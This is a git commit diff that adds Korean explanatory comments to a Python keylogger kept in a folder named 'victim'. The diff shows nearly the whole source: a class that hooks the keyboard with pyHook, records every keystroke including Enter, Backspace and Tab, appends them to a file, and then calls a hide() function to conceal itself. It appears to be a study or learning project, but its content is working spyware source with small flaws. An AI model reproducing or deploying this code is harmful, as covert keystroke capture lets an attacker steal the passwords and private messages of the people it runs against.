7466dccbe50a05c3d26a506483241d37eb11c977
진병욱 <cutepassion@outlook.com>
2022-11-25 02:52:25 +0900

    Update keylog.py

--- victim/placeholder/keylog.py
+++ victim/placeholder/keylog.py
@@ -5,33 +5,33 @@ class keyLogger:
 
     def __init__(self,path):
         self.data = ''
-        self.path = path
+        self.path = path # 경로를 입력 받음
 
-    def keypressed(self,event):
+    def keypressed(self,event): #키보드 입력
         if event.Ascii==13:
-            keys='<ENTER>'
+            keys='<ENTER>' #엔터
         elif event.Ascii==8:
-            keys='<BACKSPACE>'
+            keys='<BACKSPACE>' #백스페이스
         elif event.Ascii==9:
-            keys='<TAB>'
+            keys='<TAB>' #탭
         else:
-            keys=chr(event.Ascii)
-        self.data=self.data+keys 
+            keys=chr(event.Ascii) #그 외는 문자
+        self.data=self.data+keys #data에 keys 값을 넘겨줌
         self.local()
 
     def local(self):
-        if len(self.data)>5:
-            fp=open(self.path,"a")
+        if len(self.data)>5: #데이터 길이가 5보다 크면
+            fp=open(self.path,"a") #파일만들고 데이터 입력 후에 파일 닫기
             fp.write(self.data)
             fp.close()
             self.data=''
 
     def run(self):
-        obj = pyHook.HookManager()
-        obj.KeyDown = self.keypressed
-        obj.HookKeyboard()
+        obj = pyHook.HookManager() #Hookmanager
+        obj.KeyDown = self.keypressed #키입력
+        obj.HookKeyboard() #키보드
         pythoncom.PumpMessages()
 
 if __name__ == '__main__':
-    keyLogger().run()
+    keyLogger().run() #키로거 
     hide()
